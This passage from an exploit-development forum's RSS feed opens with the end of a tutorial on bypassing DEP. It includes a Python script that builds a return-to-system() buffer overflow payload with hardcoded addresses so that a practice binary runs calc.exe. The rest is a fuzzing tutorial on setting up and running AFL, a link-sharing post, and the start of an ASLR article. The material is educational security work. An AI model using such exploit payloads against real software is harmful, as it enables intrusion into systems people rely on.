with open("fichero.dat", "w") as file:
	file.write(data)

subprocess.call(r"stack9b.exe")
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/a/a9a67cdb72adf827e5b5e409ccbde82b00fdf3ec.png" data-download-href="/uploads/short-url/ocNoegAKYfH4niKqNtkUZgXSBS4.png?dl=1" title="stack_opt" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a9a67cdb72adf827e5b5e409ccbde82b00fdf3ec.png" alt="stack_opt" data-base62-sha1="ocNoegAKYfH4niKqNtkUZgXSBS4" width="690" height="329"></a></div><br>
<div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/1/10202ccbd2956a2842c363acefbe38e16a2e2a6f.png" data-download-href="/uploads/short-url/2iEzATDjtdUSlJk5U8qQJAg9Cmb.png?dl=1" title="idaex_opt" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/1/10202ccbd2956a2842c363acefbe38e16a2e2a6f.png" alt="idaex_opt" data-base62-sha1="2iEzATDjtdUSlJk5U8qQJAg9Cmb" width="690" height="195"></a></div><br>
<div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/9/97e7b9ddf00f11d1b8330b677c915395f5bc0a37.png" data-download-href="/uploads/short-url/lFOzgrHDAlgKDEigkfKrQNtat7N.png?dl=1" title="pe_opt(1)" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/9/97e7b9ddf00f11d1b8330b677c915395f5bc0a37.png" alt="pe_opt(1)" data-base62-sha1="lFOzgrHDAlgKDEigkfKrQNtat7N" width="690" height="277"></a></div><p></p>
<p>Well, we already have EIP under control but now it doesn’t allow me to execute my shellcode, this is due to <strong>DEP</strong> (data execution prevention).</p>
<p><em>Summarizing up, DEP changes the permissions of the segments where data is stored to prevent us from executing code there   -ricnar</em></p>
<p>So to bypass the DEP we can do <strong>ROP</strong> (return oriented programming) which is basically using gadgets that are program’s executable code to change the stack permissions with some api like <strong>VirtualProtect</strong> or <strong>VirtualAlloc</strong></p>
<p>Looking for gadgets in <strong>pepe.dll</strong> I couldn’t find VirtualAlloc, but there is a pointer to <strong>system()</strong> , would only be missing a return that can be <strong>exit()</strong> and a fixed place that we can control to pass it a string to system()</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/339c2d545022c054d21037730383cf022128555f.png" alt="system_opt(1)" data-base62-sha1="7myXrH1XyIzaq5QNka1KxltAOGr" width="500" height="270"><br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/9/9c05b9a72fb45ec9c15ec8d99c214b590a885b0d.png" alt="exit_opt" data-base62-sha1="mgeKB6YwmVjl4LSbUDMajQ2sZ2t" width="500" height="55"></p>
<p>Now only the string for system() would be missing, we can use the address with write permission</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/2e8fd263e848b53b8b135f485a278d96cf99505e.png" alt="calc_opt(1)" data-base62-sha1="6DU6eldeB03SW5pXOdV3AcJZzVs" width="600" height="82"></p>
<p>Here I set up the stack because <strong>malloc</strong> only assigned 50 bytes and then had no control over the eip and that’s how the exploit would look.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/c/c23b185d41f0f55226914125c67ca1f40ec3cd20.png" data-download-href="/uploads/short-url/rIfeSUukjw2ha9F8FMq4fXLB280.png?dl=1" title="good_opt" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c23b185d41f0f55226914125c67ca1f40ec3cd20.png" alt="good_opt" data-base62-sha1="rIfeSUukjw2ha9F8FMq4fXLB280" width="690" height="310"></a></div><p></p>
<pre data-code-wrap="python"><code class="lang-python">import subprocess

system = "\x24\x98\x01\x78"    # system()
calc = "calc.exe"

buff = "\x41" * 42
#ebp_20 = "\x41" * 4
ebp_1c = "\x30\x30\x10\x10"    # Address with write permission
ebp_18 = "\x41" * 4
ebp_14 = "\x41" * 4
ebp_10 = "\x41" * 4
ebp_c = "\x41" * 4
ebp_8 = "\x41" * 4
ebp_4 = "\x41" * 4
s = "\x41" * 4    # ebp
r = system
exit = "\x78\x1d\x10\x10"    # exit()
ptr_calc = "\x5a\x30\x10\x10"



data = "\x21\x1210" + "\x12\x12$(" + "\xff" + buff + calc + "\x41" * 6 +  ebp_1c + ebp_18 + ebp_14 + ebp_10 + ebp_c + ebp_8 + ebp_4 + s + r + exit + ptr_calc

with open("fichero.dat", "w") as file:
	file.write(data)

subprocess.call(r"stack9b.exe")
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/1/17b7def17c2540e0b5e53c5b811e956a4201298a.png" data-download-href="/uploads/short-url/3nOVflwi6BkMO1glJmUirb7Hw2m.png?dl=1" title="WO_opt" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/1/17b7def17c2540e0b5e53c5b811e956a4201298a.png" alt="WO_opt" data-base62-sha1="3nOVflwi6BkMO1glJmUirb7Hw2m" width="690" height="330"></a></div><p></p>
            <p><small>13 posts - 9 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/bypass-data-execution-protection-dep/6988">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/bypass-data-execution-protection-dep/6988</link>
          <pubDate>Tue, 05 Jun 2018 11:19:56 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-6988</guid>
          <source url="https://d.clarkee.co.uk/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
        </item>
        <item>
          <title>Favorite Vuln Sites</title>
          <dc:creator><![CDATA[dtwozero]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>I’m curious what everyones favorte go to site for new vulns are. One of my favorites is <a href="https://cxsecurity.com/" rel="nofollow noopener">https://cxsecurity.com/</a></p>
<p>just easier to browse through via web browser than exploitdb IMO.</p>
            <p><small>6 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/favorite-vuln-sites/6965">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/favorite-vuln-sites/6965</link>
          <pubDate>Mon, 04 Jun 2018 03:39:48 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-6965</guid>
          <source url="https://d.clarkee.co.uk/t/favorite-vuln-sites/6965.rss">Favorite Vuln Sites</source>
        </item>
        <item>
          <title>Fuzzing projects with american fuzzy lop (AFL)</title>
          <dc:creator><![CDATA[ricksanchez]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h2><a name="p-24133-preface-1" class="anchor" href="https://d.clarkee.co.uk#p-24133-preface-1"></a>Preface</h2>
<p>This quick article will give a short introduction on what fuzzers are, how they work and how to properly setup the afl - american fuzzy lop fuzzer to find flaws in arbitrary projects.</p>
<p>Well known alternatives to afl (for the same or other purposes):</p>
<ul>
<li><a href="https://github.com/jtpereyda/boofuzz">boofuzz: Network Protocol Fuzzing for Humans</a></li>
<li><a href="https://github.com/google/oss-fuzz">Googles - OSS-Fuzz - Continuous Fuzzing for Open Source Software</a></li>
<li>tbc…</li>
</ul>
<h2><a name="p-24133-what-is-fuzzing-2" class="anchor" href="https://d.clarkee.co.uk#p-24133-what-is-fuzzing-2"></a>What is fuzzing?</h2>
<p>In short we can define fuzzing as the following</p>
<pre><code> "Fuzzing is a Black Box software testing technique, which basically consists in finding implementation bugs using malformed/semi-malformed data injection in an automated fashion."
</code></pre>
<p>This approach can be done on the whole application, specific protocols and even single file formats.<br>
Depending on the attack vector the output changes obviously and can lead to a varying number of bugs.</p>
<h3><a name="p-24133-cool-stuff-about-fuzzing-3" class="anchor" href="https://d.clarkee.co.uk#p-24133-cool-stuff-about-fuzzing-3"></a>Cool stuff about fuzzing</h3>
<ul>
<li>simple design, hence a basic fuzzer can be easily implemented from scratch</li>
<li>finds possible bugs/flaws via a random approach, which often are overlooked by human QA</li>
<li>combinations of different input mutations and symbolic execution!</li>
</ul>
<h3><a name="p-24133-not-so-cool-stuff-4" class="anchor" href="https://d.clarkee.co.uk#p-24133-not-so-cool-stuff-4"></a>Not so cool stuff…</h3>
<ul>
<li>Often ‘simple bugs’ only</li>
<li>black box testing makes it difficult to evaluate impact of found results</li>
<li>many fuzzers are limited to a certain protocol/architecture/…</li>
</ul>
<hr>
<h2><a name="p-24133-how-to-set-up-afl-for-fuzzing-with-exploitable-and-gdb-5" class="anchor" href="https://d.clarkee.co.uk#p-24133-how-to-set-up-afl-for-fuzzing-with-exploitable-and-gdb-5"></a>How to set up afl for fuzzing with exploitable and gdb</h2>
<p>Let’s get right into setting up our environment… Not much else to say before that.<br>
Juicy stuff ahead!</p>
<h3><a name="p-24133-get-afl-running-by-cloning-the-repos-6" class="anchor" href="https://d.clarkee.co.uk#p-24133-get-afl-running-by-cloning-the-repos-6"></a>Get afl running by cloning the repos</h3>
<pre data-code-wrap="bash"><code class="lang-bash">git clone https://github.com/mirrorer/afl.git afl
cd afl
make &amp;&amp; sudo make install
su root
echo core &gt;/proc/sys/kernel/core_pattern
cd /sys/devices/system/cpu &amp;&amp; echo performance | tee cpu*/cpufreq/scaling_governor
exit
sudo apt install gnuplot
# --------------------------------------------------------------------------- #
git clone https://github.com/rc0r/afl-utils.git afl-utils
cd afl-utils
sudo python setup.py install
# --------------------------------------------------------------------------- #
# -----------------------------------optional-------------------------------- #
# --------------------------------------------------------------------------- #
# check the official git repo for needed/supported architectures #
git clone https://github.com/shellphish/afl-other-arch.git afl-qemu-patch
cd afl-qemu-patch
./build.sh &lt;list,of,arches,you,need&gt;
</code></pre>
<p>Once installed you’re ready to start fuzzing your favorite project.<br>
We’ll come to this in the next paragraph by picking a random github project.<br>
I’ll provide the used afl commands for the later shown results at the end of the article, but won’t name the fuzzed repository for privacy reasons.</p>
<h3><a name="p-24133-instrument-afl-and-start-pwning-help-securing-github-repositories-7" class="anchor" href="https://d.clarkee.co.uk#p-24133-instrument-afl-and-start-pwning-help-securing-github-repositories-7"></a>Instrument afl and  <s>start pwning</s> help securing GitHub repositories</h3>
<p>If the source code is available compile it with <code>CC=afl-gcc make</code>, or <code>CC=afl-gcc cmake CMakeLists.txt &amp;&amp; make</code> to instrument afl.</p>
<pre data-code-wrap="bash"><code class="lang-bash">$ cd targeted_application
CC=afl-gcc cmake CMakeLists.txt &amp;&amp; make
-- The C compiler identification is GNU 5.4.0
-- Check for working C compiler: /usr/local/bin/afl-gcc
-- Check for working C compiler: /usr/local/bin/afl-gcc -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Detecting C compile features
-- Detecting C compile features - done
-- Configuring done
-- Generating done
-- Build files have been written to: /home/lab/Git/&lt;target&gt;
Scanning dependencies of target &lt;target&gt;
[ 14%] Building C object &lt;target&gt;
afl-cc 2.52b by &lt;lcamtuf@google.com&gt;
afl-as 2.52b by &lt;lcamtuf@google.com&gt;
[+] Instrumented 5755 locations (64-bit, non-hardened mode, ratio 100%).
[ 28%] Linking C static library &lt;target&gt;
[ 28%] Built target &lt;target&gt;
Scanning dependencies of target md2html
[ 42%] Building C object &lt;target&gt;
afl-cc 2.52b by &lt;lcamtuf@google.com&gt;
afl-as 2.52b by &lt;lcamtuf@google.com&gt;
[+] Instrumented 165 locations (64-bit, non-hardened mode, ratio 100%).
[ 57%] Building C object &lt;target&gt;
afl-cc 2.52b by &lt;lcamtuf@google.com&gt;
afl-as 2.52b by &lt;lcamtuf@google.com&gt;
[+] Instrumented 8 locations (64-bit, non-hardened mode, ratio 100%).
[ 71%] Building C object &lt;target&gt;
afl-cc 2.52b by &lt;lcamtuf@google.com&gt;
afl-as 2.52b by &lt;lcamtuf@google.com&gt;
[+] Instrumented 58 locations (64-bit, non-hardened mode, ratio 100%).
[ 85%] Building C object &lt;target&gt;
afl-cc 2.52b by &lt;lcamtuf@google.com&gt;
afl-as 2.52b by &lt;lcamtuf@google.com&gt;
[+] Instrumented 407 locations (64-bit, non-hardened mode, ratio 100%).
[100%] Linking C executable &lt;target&gt;
afl-cc 2.52b by &lt;lcamtuf@google.com&gt;
[100%] Built target &lt;target&gt;
</code></pre>
<p>To start local application fuzzing we can execute afl via the following command chain:</p>
<pre data-code-wrap="bash"><code class="lang-bash">$ afl-fuzz -i input_sample_dir -o output_crash_dir ./binary @@
</code></pre>
<pre><code>-i  defines a folder which holds sample data for the fuzzer to use
-o defines a folder where afl will save the fuzzing results
./binary describes the targeted application
</code></pre>
<p>If you have the ressources to start more processes of afl keep in mind that each process takes up one CPU core and pretty much leverages 100% of its power.<br>
To do so a change up of the afl command chain is needed!</p>
<pre data-code-wrap="bash"><code class="lang-bash">$ afl-fuzz -i input_sample_dir -o output_crash_dir -M master ./binary @@
$ afl-fuzz -i input_sample_dir -o output_crash_dir -S slaveX ./binary @@
</code></pre>
<p>The only difference between the master and slave modes is that the master instance will still perform deterministic checks.<br>
The slaves will proceed straight to random tweaks.<br>
If you don’t want to do deterministic fuzzing at all you can straight up just spawn slaves.<br>
For statistic- and behavior-research having one master process is always a nice thing tho.</p>
<blockquote>
<p>Note: For programs that take input from a file, use ‘@@’ to mark the location in the target’s command line where the input file name should be placed. The fuzzer will substitute this for you.</p>
</blockquote>
<blockquote>
<p>Note2: You can either provide an empty file in the input_sample_dir and let afl find some fitting input,  or give some context specfic input for the program you’re fuzzing that is parsable!</p>
</blockquote>
<p>To <a href="https://github.com/mirrorer/afl/blob/master/qemu_mode/README.qemu">instrument afl-QEMU</a> for blackbox fuzzing install needed dependencies <code>sudo apt-get install libtool libtool-bin automake bison libglib2.0-dev zlib1g-dev</code> and execute <code>./build_qemu_support.sh</code> within the afl repo <a href="https://github.com/mirrorer/afl.git">~/afl/qemu_mode/</a>.</p>
<p>Next up compile target program <strong>without</strong> <code>CC=afl-gcc</code> and change the afl-fuzz command chain to:</p>
<pre data-code-wrap="bash"><code class="lang-bash">$ afl-fuzz -Q -i input_sample_dir -o output_crash_dir -M master ./binary @@
</code></pre>
<p>The emulation should work on its own already now.<br>
To support different, more exotic architectures in afl apply said patch from the prep work above!</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/9/95abb3f90f7243113f1e1be37248fed642a70dd7.png" data-download-href="/uploads/short-url/lm30W7dCxxX6X1UGhqAK5UQcz8X.png?dl=1" title="afl_m"><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/95abb3f90f7243113f1e1be37248fed642a70dd7.png" alt="afl_m" data-base62-sha1="lm30W7dCxxX6X1UGhqAK5UQcz8X" width="648" height="416"></a></div><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/b/b21f14fd0c7287936740fc8ab7d632e20b8e7603.png" data-download-href="/uploads/short-url/ppJA7t66yjKwFAc6CnNMotCqcAH.png?dl=1" title="afl_s"><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b21f14fd0c7287936740fc8ab7d632e20b8e7603.png" alt="afl_s" data-base62-sha1="ppJA7t66yjKwFAc6CnNMotCqcAH" width="663" height="435"></a></div><p></p>
<p>Above we can see the difference between master and slaves as well as the general interface of afl after starting the fuzzing process.<br>
As displayed here, our slave found a bunch of unique crashes after only measly 12 minutes with its random fuzzing behavior.<br>
The master slave on the other hand didn’t quite catch up to that yet…</p>
<p>The crashes and hangs can be manually examined within the <em>output_crash_dir/process_name/crashes</em> and  <em>output_crash_dir/process_name/hangs</em> folders.<br>
Since this manual labor is neither interesting nor effective some smart people offered us the afl-utils package, which automatizes the crash analysis and pairs it with a sweet output from a gdb script.</p>
<h3><a name="p-24133-automatic-analysis-of-produced-crashes-8" class="anchor" href="https://d.clarkee.co.uk#p-24133-automatic-analysis-of-produced-crashes-8"></a>Automatic analysis of produced crashes</h3>
<p>To automatically collect and analysis crashes with afl-collect + <a href="https://github.com/jfoote/exploitable">exploitable</a> from the <a href="https://github.com/rc0r/afl-utils">afl-utils package</a> do the following while the fuzzing processes are still up and running:</p>
<pre data-code-wrap="bash"><code class="lang-bash">$ afl-collect -d crashes.db -e gdb_script -r -rr ./output_crash_dir_from_afl_fuzz ./afl_collect_output_dir -j 8 -- /path/to/target
</code></pre>
<p>The only two parameters to change here  are the the <em>./output_crash_dir_from_afl_fuzz</em>, which is the folder where the afl-fuzz process stores its output.<br>
Next up is the <em>/path/to/target</em>, which is the fuzzed application.<br>
Depending on your hardware you can adjust the <em>-j 8</em> parameter, which is used to specify the amount of threads to analyze the output.</p>
<p>If everything works accordingly you’ll stumble upon an output like this:</p>
<pre data-code-wrap="bash"><code class="lang-bash">afl-collect -d crashes.db -e gdb_script -r -rr ./out ./output_aflc -j 8 -- ./path/to/target
afl-collect 1.33a by rc0r &lt;hlt99@blinkenshell.org&gt; # @_rc0r
Crash sample collection and processing utility for afl-fuzz.

[*] Going to collect crash samples from '/home/lab/Git/code/path/to/target/out'.
[!] Table 'Data' not found in existing database!
[*] Creating new table 'Data' in database '/home/lab/Git/code/path/to/target/crashes.db' to store data!
[*] Found 3 fuzzers, collecting crash samples.
[*] Successfully indexed 56 crash samples.
*** Error in `/home/lab/Git/code/path/to/target': double free or corruption (out): 0x000000000146c5a0 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f0acaeb67e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7f0acaebf37a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f0acaec353c]
/home/lab/Git/code/path/to/target(&lt;func_a&gt;+0x93fd)[0x4627ed]
/home/lab/Git/code/path/to/target(&lt;func_b&gt;+0xaa)[0x40e75a]
/home/lab/Git/code/path/to/target(main+0x4c4)[0x4017f4]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f0acae5f830]
/home/lab/Git/code/path/to/target(_start+0x29)[0x402169]
======= Memory map: ========
00400000-00401000 r--p 00000000 fd:00 38669039                           /home/lab/Git/code/path/to/target/
00401000-00476000 r-xp 00001000 fd:00 38669039                           /home/lab/Git/code/path/to/target/l
00476000-0048a000 r--p 00076000 fd:00 38669039                           /home/lab/Git/code/path/to/target/
0048a000-0048b000 r--p 00089000 fd:00 38669039                           /home/lab/Git/code/path/to/target
0048b000-0048c000 rw-p 0008a000 fd:00 38669039                           /home/lab/Git/code/path/to/target
01461000-0148a000 rw-p 00000000 00:00 0                                  [heap]
7f0ac4000000-7f0ac4021000 rw-p 00000000 00:00 0
7f0ac4021000-7f0ac8000000 ---p 00000000 00:00 0
7f0acac29000-7f0acac3f000 r-xp 00000000 fd:00 40899039                   /lib/x86_64-linux-gnu/libgcc_s.so.1
7f0acac3f000-7f0acae3e000 ---p 00016000 fd:00 40899039                   /lib/x86_64-linux-gnu/libgcc_s.so.1
7f0acae3e000-7f0acae3f000 rw-p 00015000 fd:00 40899039                   /lib/x86_64-linux-gnu/libgcc_s.so.1
7f0acae3f000-7f0acafff000 r-xp 00000000 fd:00 40895232                   /lib/x86_64-linux-gnu/libc-2.23.so
7f0acafff000-7f0acb1ff000 ---p 001c0000 fd:00 40895232                   /lib/x86_64-linux-gnu/libc-2.23.so
7f0acb1ff000-7f0acb203000 r--p 001c0000 fd:00 40895232                   /lib/x86_64-linux-gnu/libc-2.23.so
7f0acb203000-7f0acb205000 rw-p 001c4000 fd:00 40895232                   /lib/x86_64-linux-gnu/libc-2.23.so
7f0acb205000-7f0acb209000 rw-p 00000000 00:00 0
7f0acb209000-7f0acb22f000 r-xp 00000000 fd:00 40895230                   /lib/x86_64-linux-gnu/ld-2.23.so
7f0acb401000-7f0acb404000 rw-p 00000000 00:00 0
7f0acb42d000-7f0acb42e000 rw-p 00000000 00:00 0
7f0acb42e000-7f0acb42f000 r--p 00025000 fd:00 40895230                   /lib/x86_64-linux-gnu/ld-2.23.so
7f0acb42f000-7f0acb430000 rw-p 00026000 fd:00 40895230                   /lib/x86_64-linux-gnu/ld-2.23.so
7f0acb430000-7f0acb431000 rw-p 00000000 00:00 0
7ffd1292a000-7ffd1294b000 rw-p 00000000 00:00 0                          [stack]
7ffd129c9000-7ffd129cc000 r--p 00000000 00:00 0                          [vvar]
7ffd129cc000-7ffd129ce000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
</code></pre>
<p>As you can see we are getting a memory map and a backtrace for every crash.<br>
Since 56 crash samples were shown here I shortened the output to make it more easy to follow, but I hope it visualizes the point well enough.<br>
The real beefy part follows now tho!</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/3/3dfb01caaf0d1e94ccc95daed20601ed866a9430.png" data-download-href="/uploads/short-url/8QiU9yDrCjZu0ntSGO4XymhJeJG.png?dl=1" title="expl"><img src="/uploads/default/original/2X/3/3dfb01caaf0d1e94ccc95daed20601ed866a9430.png" alt="expl" data-base62-sha1="8QiU9yDrCjZu0ntSGO4XymhJeJG" width="510" height="500"></a></div><p></p>
<p>We’re getting a complete overview about which process and what algorithm produced the error.<br>
Additionally we can see the type of error coupled with an estimate on if it is exploitable or not.<br>
This gives us the chance dig deeper into the <em>/afl_out/process_name/crash_id/</em>, which is the used input to generate certain crash.<br>
We can then analyze it and try to conclude why crash occured and maybe even produce one or multiple PoCs to abuse this behavior!<br>
A big disadvantage as of right now is that the exploitaple script can only handle the most common architecutres (x86 and ARM)!<br>
If you want to fuzz MIPS and PowerPC you need to fork the official repository and write your own logic for this!</p>
<p>Creating a PoC for our target application gets even easier, since  we can directly jump into gdb and execute the crash on our fuzzed program!<br>
Simply run the following from the commandline:</p>
<pre data-code-wrap="sh"><code class="lang-sh">$ gdb ./fuzzed_application
gdb&gt; run /path/to/crash_folder/crash_id
</code></pre>
<p>If we have a gdb extension like <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>, or <a href="https://github.com/longld/peda">gdb-peda</a> inspecting what went wrong makes it a breeze!</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/3/38fee97499e015dbaaa2be6084dadb52700c3207.png" data-download-href="/uploads/short-url/88cSQAox5C4MR1GDmbrvldJZyqH.png?dl=1" title="peda"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/3/38fee97499e015dbaaa2be6084dadb52700c3207_2_561x499.png" alt="peda" data-base62-sha1="88cSQAox5C4MR1GDmbrvldJZyqH" width="561" height="499" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/3/38fee97499e015dbaaa2be6084dadb52700c3207_2_561x499.png, https://0x00sec.s3.amazonaws.com/optimized/2X/3/38fee97499e015dbaaa2be6084dadb52700c3207_2_841x748.png 1.5x, /uploads/default/original/2X/3/38fee97499e015dbaaa2be6084dadb52700c3207.png 2x"></a></div><p></p>
<p>We can see the state of the register at one glance, while also getting an overview of which function crashed from the generated input.<br>
Now we could dig through the actual source code and find an answer on why the heck it crashed there. Why did the used input make the program go haywire?<br>
When finding an answer to this you can manually create a malformed input yourself and write a PoC for this.</p>
<p>To show you an overview on how much afl managed to deform my actual input for this crash I’ll show you a side by side comparison of the original input and the one afl managed to produce to crash the target at the shown state:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/b/bec4de75d26ea8056a0c14b2799ca298b97d6756.png" data-download-href="/uploads/short-url/rdCvzwpxSS1TytWX2752hIXFZC6.png?dl=1" title="hex"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bec4de75d26ea8056a0c14b2799ca298b97d6756_2_528x500.png" alt="hex" data-base62-sha1="rdCvzwpxSS1TytWX2752hIXFZC6" width="528" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bec4de75d26ea8056a0c14b2799ca298b97d6756_2_528x500.png, https://0x00sec.s3.amazonaws.com/optimized/2X/b/bec4de75d26ea8056a0c14b2799ca298b97d6756_2_792x750.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/b/bec4de75d26ea8056a0c14b2799ca298b97d6756_2_1056x1000.png 2x"></a></div><p></p>
<p>Green bytes indicate that the files are still indentical in that exact location.<br>
Red bytes indiciate a difference, meaning afl mutated theses bytes on its own accord (the ones on the right are the afl mutated ones).</p>
<hr>
<h2><a name="p-24133-plotting-the-results-from-afl-9" class="anchor" href="https://d.clarkee.co.uk#p-24133-plotting-the-results-from-afl-9"></a>Plotting the results from afl</h2>
<p>For those among us, who are number and statistic nerds, afl provides a great feature for us!<br>
For every spawned process we get plottable data!</p>
<pre data-code-wrap="bash"><code class="lang-bash">$ ls
crashes  fuzz_bitmap  fuzzer_stats  hangs  out  plot_data  queue

$ afl-plot --help
progress plotting utility for afl-fuzz by &lt;lcamtuf@google.com&gt;

This program generates gnuplot images from afl-fuzz output data. Usage:

/usr/local/bin/afl-plot afl_state_dir graph_output_dir

$ afl-plot . out
progress plotting utility for afl-fuzz by &lt;lcamtuf@google.com&gt;

[*] Generating plots...
[*] Generating index.html...
[+] All done - enjoy your charts!
</code></pre>
<p>This generates 3 plots:</p>
<ul>
<li>One for the execution speed/sec,</li>
<li>One for the path coverage,</li>
<li>And one for the found crashes and hangs.</li>
</ul>
<p>For my particular fuzzing example for the sake of this article they look like this:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/3/31766c5e7110c5c3e68a2dbf419ebe3cedfa5b80.png" data-download-href="/uploads/short-url/73z7f7pLsmPfh2kbYlBRtZtCI0g.png?dl=1" title="stat1"><img src="/uploads/default/original/2X/3/31766c5e7110c5c3e68a2dbf419ebe3cedfa5b80.png" alt="stat1" data-base62-sha1="73z7f7pLsmPfh2kbYlBRtZtCI0g" width="690" height="138"></a></div><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/2/221f783b09f9c7d85bf8611294bf1cc2cf23b67e.png" data-download-href="/uploads/short-url/4RREL5w5ECDsO0nKPumWrwnwSuO.png?dl=1" title="stat1"><img src="/uploads/default/original/2X/2/221f783b09f9c7d85bf8611294bf1cc2cf23b67e.png" alt="stat1" data-base62-sha1="4RREL5w5ECDsO0nKPumWrwnwSuO" width="690" height="138"></a></div><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/f/f18cc560af58f594c9262bfdda7aa8541fca0e6a.png" data-download-href="/uploads/short-url/ysQFAOOtUhVVO7yyF5DvlK3qtPY.png?dl=1" title="stat1"><img src="/uploads/default/original/2X/f/f18cc560af58f594c9262bfdda7aa8541fca0e6a.png" alt="stat1" data-base62-sha1="ysQFAOOtUhVVO7yyF5DvlK3qtPY" width="690" height="206"></a></div><p></p>
<p>Final note on this: The stats shown in the afl fuzzing interface during the process fuzzing up until termination are stored for each process in a separate file too!</p>
<hr>
<h1><a name="p-24133-conclusion-10" class="anchor" href="https://d.clarkee.co.uk#p-24133-conclusion-10"></a>Conclusion</h1>
<p>Fuzzing creates a powerful way to test projects on faults and flaws within the code.<br>
Depending on the used fuzzer the generated output can directly be used to deduct a possible exploit or PoC.</p>
<p>In the case of american fuzzy lop the base functionality already is great and definitely one of the faster fuzzing tools out there.<br>
The possible combination with afl-utils and the exploitable gdb script makes it even more awesome.</p>
<p>Last but not least it would be nice to test OSS, boofuzz or other not mentioned fuzzing frameworks to see how they can compete against each other.</p>
<p>I hope this quick and dirty overview showed that fuzzing is a strong approach to try to harden an application by finding critical flaws one could easily overlook with human QA.<br>
Please keep in mind that his demo presented here was done using a fairly broken repository..<br>
If you start fuzzing things and not much crashes come around that’s a good thing and you should not be sad about that, especially if it is your code, or widely used one <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> !</p>
<p>With that in mind: Happy fuzzing!</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/fuzzing-projects-with-american-fuzzy-lop-afl/6498">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/fuzzing-projects-with-american-fuzzy-lop-afl/6498</link>
          <pubDate>Mon, 30 Apr 2018 11:09:01 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-6498</guid>
          <source url="https://d.clarkee.co.uk/t/fuzzing-projects-with-american-fuzzy-lop-afl/6498.rss">Fuzzing projects with american fuzzy lop (AFL)</source>
        </item>
        <item>
          <title>Exploit Mitigation Techniques - Address Space Layout Randomization (ASLR)</title>
          <dc:creator><![CDATA[ricksanchez]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h2><a name="p-21375-preface-1" class="anchor" href="https://d.clarkee.co.uk#p-21375-preface-1"></a>Preface</h2>
<p>Hey there!<br>
I’m finally ready to present you the third installment of the series <em>exploit mitigation techniques</em>.</p>
